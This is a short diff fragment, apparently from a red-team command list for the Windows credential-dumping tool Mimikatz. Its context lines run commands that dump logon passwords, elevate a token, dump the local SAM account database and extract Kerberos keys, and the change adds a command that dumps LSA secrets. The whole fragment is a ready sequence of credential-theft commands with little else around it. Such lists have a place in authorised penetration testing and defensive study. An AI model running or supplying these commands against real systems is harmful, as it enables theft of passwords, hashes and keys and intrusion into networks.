@@ -27,6 +27,7 @@ sekurlsa::logonpasswords
 # Dump credentials for local accounts
 token::elevate
 lsadump::sam
+lsadump::secrets
 token::revert
 
 # Extract kerberos encryption keys
